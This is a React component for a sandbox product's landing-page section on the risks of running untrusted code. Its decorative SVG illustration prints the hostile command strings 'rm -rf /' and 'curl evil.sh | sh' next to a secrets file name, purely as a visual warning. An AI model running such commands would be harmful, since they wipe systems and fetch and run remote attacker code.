import { useRef } from "react";
import { motion, useInView } from "motion/react";

const cards = [
  {
    eyebrow: "Untrusted code",
    title: "You can't run someone else's code on your laptop.",
    body: "Whether it's an AI agent writing scripts, a customer uploading code, or a third-party plugin — once it executes locally, it has the same access you do. Mistakes, fork bombs, or worse.",
    visual: "files",
  },
  {
    eyebrow: "Wrong shape",
    title: "VMs are slow. Containers leak.",
    body: "VMs start in minutes and burn memory. Containers share a kernel with the host. Neither is the right tool for an ephemeral environment you spin up, use once, and throw away.",
    visual: "compare",
  },
  {
    eyebrow: "Per-user scale",
    title: "Every user wants their own environment.",
    body: "Coding playgrounds, AI agent tools, evaluation harnesses — they all need fresh, isolated workspaces per session. Building that yourself means orchestration, security, scheduling, and a lot of pager calls.",
    visual: "grid",
  },
] as const;

function Visual({ kind }: { kind: (typeof cards)[number]["visual"] }) {
  if (kind === "files") {
    return (
      <svg viewBox="0 0 200 80" className="h-16 w-auto" aria-hidden="true">
        <rect x="6" y="10" width="50" height="60" rx="3" className="fill-brimble-black/8 stroke-brimble-black/20" />
        <rect x="14" y="20" width="30" height="2" className="fill-brimble-black/35" />
        <rect x="14" y="27" width="22" height="2" className="fill-brimble-black/25" />
        <rect x="14" y="34" width="28" height="2" className="fill-brimble-black/25" />
        <text x="68" y="44" className="fill-brimble-black/55 font-mono text-[9px]">
          ./secret_keys.env
        </text>
        <text x="68" y="55" className="fill-[#ff5f57] font-mono text-[9px]">
          ✗ rm -rf /
        </text>
        <text x="68" y="66" className="fill-brimble-black/45 font-mono text-[9px]">
          curl evil.sh | sh
        </text>
      </svg>
    );
  }
  if (kind === "compare") {
    return (
      <svg viewBox="0 0 200 80" className="h-16 w-auto" aria-hidden="true">
        <g>
          <rect x="6" y="14" width="84" height="52" rx="4" className="fill-brimble-black/5 stroke-brimble-black/20" />
          <text x="14" y="28" className="fill-brimble-black/55 font-mono text-[9px] uppercase tracking-[1px]">
            VM
          </text>
          <text x="14" y="44" className="fill-brimble-black/70 font-mono text-[10px]">
            boot
          </text>
          <text x="48" y="44" className="fill-brimble-black/80 font-mono text-[10px]">
            ~ 60s
          </text>
          <rect x="14" y="50" width="62" height="3" rx="1.5" className="fill-brimble-black/15" />
          <rect x="14" y="50" width="58" height="3" rx="1.5" className="fill-[#ff5f57]/70" />
        </g>
        <g>
          <rect x="110" y="14" width="84" height="52" rx="4" className="fill-brimble-black/5 stroke-brimble-black/20" />
          <text x="118" y="28" className="fill-brimble-black/55 font-mono text-[9px] uppercase tracking-[1px]">
            Container
          </text>
          <text x="118" y="44" className="fill-brimble-black/70 font-mono text-[10px]">
            kernel
          </text>
          <text x="152" y="44" className="fill-brimble-black/80 font-mono text-[10px]">
            shared
          </text>
          <rect x="118" y="50" width="62" height="3" rx="1.5" className="fill-brimble-black/15" />
          <rect x="118" y="50" width="60" height="3" rx="1.5" className="fill-[#febc2e]/80" />
        </g>
      </svg>
    );
  }
  return (
    <svg viewBox="0 0 200 80" className="h-16 w-auto" aria-hidden="true">
      {Array.from({ length: 24 }).map((_, i) => {
        const x = 6 + (i % 8) * 24;
        const y = 12 + Math.floor(i / 8) * 22;
        return (
          <rect
            key={i}
            x={x}
            y={y}
            width="18"
            height="16"
            rx="2"
            className={
              i % 5 === 0 ? "fill-brimble-accent-blue/35 stroke-brimble-accent-blue/60" : "fill-brimble-black/5 stroke-brimble-black/15"
            }
          />
        );
      })}
    </svg>
  );
}

export function SandboxProblem() {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: true, margin: "-80px" });

  return (
    <section className="border-t border-[rgba(152,157,164,0.2)] bg-brimble-air-gray px-6 py-[88px] transition-colors duration-300 dark:border-white/5">
      <div ref={ref} className="mx-auto flex max-w-[1120px] flex-col gap-12">
        <motion.div
          className="flex max-w-[680px] flex-col gap-3"
          initial={{ opacity: 0, y: 24 }}
          animate={isInView ? { opacity: 1, y: 0 } : {}}
          transition={{ duration: 0.6, ease: [0.16, 1, 0.3, 1] }}
        >
          <span className="font-mono text-xs uppercase tracking-[1.6px] text-brimble-black/50">The shape of the problem</span>
          <h2 className="text-balance font-heading text-[40px] font-medium leading-[46px] tracking-[-0.576px] text-brimble-black md:text-[44px] md:leading-[50px]">
            Running code you didn't write is harder than it looks.
          </h2>
        </motion.div>

        <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
          {cards.map((card, i) => (
            <motion.article
              key={card.eyebrow}
              className="flex h-full flex-col gap-5 rounded-2xl border border-[rgba(152,157,164,0.25)] bg-brimble-surface p-6 shadow-[var(--shadow-button)] dark:border-white/10 dark:bg-[#1a1c1e]"
              initial={{ opacity: 0, y: 24 }}
              animate={isInView ? { opacity: 1, y: 0 } : {}}
              transition={{ duration: 0.6, delay: 0.15 + i * 0.08, ease: [0.16, 1, 0.3, 1] }}
            >
              <div className="flex items-center justify-between">
                <span className="font-mono text-[10px] uppercase tracking-[1.4px] text-brimble-black/45">{card.eyebrow}</span>
                <span className="font-mono text-[10px] text-brimble-black/30">0{i + 1}</span>
              </div>
              <h3 className="font-body text-[19px] font-medium leading-[24px] tracking-[-0.32px] text-brimble-black">{card.title}</h3>
              <p className="text-pretty font-body text-[14.5px] leading-[21px] tracking-[-0.2px] text-brimble-black/60">{card.body}</p>
              <div className="mt-auto pt-2">
                <Visual kind={card.visual} />
              </div>
            </motion.article>
          ))}
        </div>
      </div>
    </section>
  );
}
